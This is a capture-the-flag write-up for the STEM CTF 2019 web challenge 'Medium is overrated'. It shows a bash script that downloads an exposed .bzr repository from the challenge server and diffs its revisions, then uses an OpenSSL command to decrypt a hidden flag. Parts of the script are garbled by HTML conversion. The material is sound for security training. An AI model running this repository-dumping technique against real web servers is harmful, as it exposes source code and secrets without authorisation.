<h1>STEM CTF Cyber Challenge 2019 – Medium is overrated</h1>

<ul>
<li><strong>Category:</strong> Web</li>
<li><strong>Points:</strong> 200</li>
</ul>

<h2>Challenge</h2>

<blockquote>
  <p>I got hacked last time, but that’s not gonna stop me. The world deserves the next great blogging platform!</p>
  
  <p>http://138.247.13.104</p>
</blockquote>

<h2>Solution</h2>

<p>Challenge is similar to the previous one (i.e. <em>My First Blog</em>), but the number of revisions is huge.</p>

<p>So a <a href="bzr-chall-solver.sh">bash script</a> can be written to reproduce the repository locally.</p>

<p>The script will recreate the <code>index.php</code> file of the previous challenge and another file called <code>noIdeaWhatImDoing</code>.</p>

<p>Analyzing the history situation with <code>bzr log</code> and some <code>bzr diff</code>, you can discover that files were modified several times. Maybe one of these revisions will contain the flag.</p>

<p>After some analysis you can discover that changes on <code>index.php</code> are the ones really important. The initial script can be modified in order to discover all important differences on <code>index.php</code>.</p>

<p>```bash</p>

<h1>!/bin/bash</h1>

<p>echo "[*] Creating local repository."
mkdir ctf-bzr
cd ctf-bzr/
bzr init
echo 'foo' &gt; foo.txt
bzr add
bzr commit -m "foo"
rm foo.txt</p>

<p>echo "[*] Replacing last-revision file."
cd .bzr/branch
rm last-revision
wget http://138.247.13.104/.bzr/branch/last-revision</p>

<p>echo "[*] Replacing dirstate file."
cd ../checkout
rm dirstate
wget http://138.247.13.104/.bzr/checkout/dirstate</p>

<p>echo "[*] Replacing pack-names file."
cd ../repository
rm pack-names
wget http://138.247.13.104/.bzr/repository/pack-names</p>

<p>echo "[<em>] Using check command to discover missing files."
cd indices/
rm *.cix
rm *.iix
rm *.rix
rm *.six
rm *.tix
cd ../packs
rm *.pack
cd ../../../
while true; do
   CHECK_OUTPUT=$(bzr check 2>&amp;1)
   if [[ $CHECK_OUTPUT == *"bzr: ERROR: No such file:"</em> ]]; then
      MISSING<em>FILE=$(echo $CHECK</em>OUTPUT | sed 's/.<em>([0-9a-f]{32}).</em>/\1/')
      echo "[<em>] Missing files $MISSING_FILE."
      declare -a EXTENSIONS=("cix" "iix" "rix" "six" "tix")
      for EXTENSION in "${EXTENSIONS[@]}"; do
         TARGET_URL="http://138.247.13.104/.bzr/repository/indices/$MISSING_FILE.$EXTENSION"
         echo "[</em>] Downloading $TARGET<em>URL"
         wget $TARGET</em>URL -P .bzr/repository/indices/
      done
      TARGET<em>URL="http://138.247.13.104/.bzr/repository/packs/$MISSING</em>FILE.pack"
      echo "[<em>] Downloading $TARGET_URL"
      wget $TARGET_URL -P .bzr/repository/packs/
   else
      echo "[</em>] Probably all missing files have been downloaded."
      break
   fi
done</p>

<p>echo "[*] Reverting missing source files."
bzr revert</p>

<p>echo "[*] Searching the flag into revisions."
R=1
while true; do
   RNEXT=$((R+1))</p>

<p># Analyzing diff.
   REVISION=$(bzr diff -r$R..$RNEXT)
   if [[ $REVISION == "" ]]; then
      break
   elif [[ $REVISION != <em>"noIdeaWhatImDoing"</em> ]]; then
      echo "[*] ... $R -> $RNEXT"
      echo $REVISION
   fi</p>

<p>R=$RNEXT
done
```</p>

<p>Two differences can be identified.</p>

<p>```
$ bzr diff -r154..155
=== modified file 'index.php'
--- index.php   2018-12-06 18:48:25 +0000
+++ index.php   2018-12-06 22:52:42 +0000
@@ -10,6 +10,11 @@
             <h1 class="display-4">My Blog</h1>
             <p class="lead">Just a spot for me to talk about how much I love Canonical</p>
         </div>
+            <h1>Encryption is so cool!</h1>
+            <p>It's so cool that I can paste a block of text here and if its encrypted then none of you will EVER be able to read it! After reading about it, I'm so comfortable with it that I'm willing to paste my Bitcoin Wallet password right here:</p>
+            <p>NWEyYTk5ZDNiYWEwN2JmYmQwOGI5NjEyMDVkY2FlODg3ZmIwYWNmOWYyNzI5MjliYWE3OTExZmFhNGFlNzc1MQ==</p>
+            <p>There's like a whole 3 Bitcoin in there, but none of you will ever be able to get it!</p>
+            <hr>
             <h1>I love Canonical</h1>
             <p>As someone who is just getting started with Linux, I love Canonical. They build the easiest to use Linux distribution I can find, and they build so many useful tools. So far I've tried out</p>
             <ul></p>

<p>$ bzr diff -r165..166
=== modified file 'index.php'
--- index.php   2018-12-06 22:54:52 +0000
+++ index.php   2018-12-06 23:00:02 +0000
@@ -10,6 +10,8 @@
             <h1 class="display-4">My Blog</h1>
             <p class="lead">Just a spot for me to talk about how much I love Canonical</p>
         </div>
+            <h1>CentOS is just RedHat</h1>
+            <p>A friend of mine was explaining how the company he works for pays for RedHat. I don't understand why they are LITERALLY throwing their money away since CentOS is just RedHat. In fact, CentOS is even better than RedHat since it discovers the fastest mirror automatically. I'm applying for one of their open job reqs just to give them a piece of my mind.</p>
             <h1>I love Canonical</h1>
             <p>As someone who is just getting started with Linux, I love Canonical. They build the easiest to use Linux distribution I can find, and they build so many useful tools. So far I've tried out</p>
             <ul>
@@ -26,4 +28,5 @@
             ?>
         </div>
     </body>
-</html>
\ No newline at end of file
+</html>
+<!-- 6fb3b5b05966fb06518ce6706ec933e79cfaea8f12b4485cba56321c7a62a077 -->
\ No newline at end of file
```</p>

<p>The first one contains a base64 encoded password for a Bitcoin wallet.</p>

<p><code>
NWEyYTk5ZDNiYWEwN2JmYmQwOGI5NjEyMDVkY2FlODg3ZmIwYWNmOWYyNzI5MjliYWE3OTExZmFhNGFlNzc1MQ==
</code></p>

<p>Decoded string is the following.</p>

<p><code>
5a2a99d3baa07bfbd08b961205dcae887fb0acf9f272929baa7911faa4ae7751
</code></p>

<p>The second one contains an hexadecimal string.</p>

<p><code>
6fb3b5b05966fb06518ce6706ec933e79cfaea8f12b4485cba56321c7a62a077
</code></p>

<p>This string must be considered like the AES ECB key to decode the Bitcoin wallet password.</p>

<p>The following OpenSSL command will give you the flag.</p>

<p><code>
$ openssl enc -d -aes-256-ecb -K '6fb3b5b05966fb06518ce6706ec933e79cfaea8f12b4485cba56321c7a62a077' -in &lt;(echo '5a2a99d3baa07bfbd08b961205dcae887fb0acf9f272929baa7911faa4ae7751' | xxd -r -p)
</code></p>

<p>The flag is the following.</p>

<p><code>
MCA{I$love$bitcoin$so$much!}
</code></p>
